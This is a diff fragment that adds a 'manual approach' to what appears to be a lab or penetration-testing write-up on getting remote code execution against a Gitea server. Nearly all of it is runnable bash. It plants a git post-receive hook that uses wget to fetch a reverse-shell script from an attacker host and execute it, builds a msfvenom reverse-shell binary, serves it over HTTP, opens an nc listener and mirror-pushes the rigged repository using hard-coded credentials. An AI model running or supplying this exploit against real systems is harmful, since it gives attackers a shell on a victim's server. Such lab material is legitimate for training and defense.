@@ -200,3 +200,72 @@ Injecting command into repo
 Error injecting command
 
 ```
+
+
+manual approach:
+
+```bash
+# Set up environment
+cd /tmp
+rm -rf exploit.git exploitsrc
+
+# Create bare repo with hook
+mkdir exploit.git
+cd exploit.git
+git init --bare
+
+# Create post-receive hook
+cat > hooks/post-receive << 'EOF'
+#!/bin/bash
+wget http://192.168.49.52:8080/reverse.sh -O /tmp/r.sh
+chmod +x /tmp/r.sh
+/tmp/r.sh
+EOF
+chmod +x hooks/post-receive
+
+# Create source repo with content
+cd /tmp
+mkdir exploitsrc
+cd exploitsrc
+git init
+git config user.email "x@x.com"
+git config user.name "x"
+echo "test" > test.txt
+git add .
+git commit -m "init"
+
+# Push to bare repo
+git push /tmp/exploit.git master
+
+# Mark for export
+touch /tmp/exploit.git/git-daemon-export-ok
+
+# Start git daemon with receive-pack enabled
+git daemon --reuseaddr --base-path=/tmp --export-all --enable=receive-pack &
+
+# Create repo on Gitea via API
+curl -s -X POST "http://192.168.52.67:3000/api/v1/user/repos" \
+  -u "hackme:hackme" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"rce2","private":false}'
+
+# Now the key step - push the bare repo to Gitea
+cd /tmp/exploit.git
+git remote add gitea "http://hackme:hackme@192.168.52.67:3000/hackme/rce2.git"
+git push --mirror gitea
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f elf -o /tmp/shell.elf
+
+# In your python http.server terminal (kill the old one with Ctrl+C and restart, or just leave it running if it's already on 8080)
+cd /tmp/ && python3 -m http.server 8080
+
+# Make sure your listener is running
+nc -nvlp 4444
+
+# Trigger it
+cd /tmp/exploitsrc
+echo "binary" >> test.txt
+git add .
+git commit -m "binary"
+git push gitea master
+```
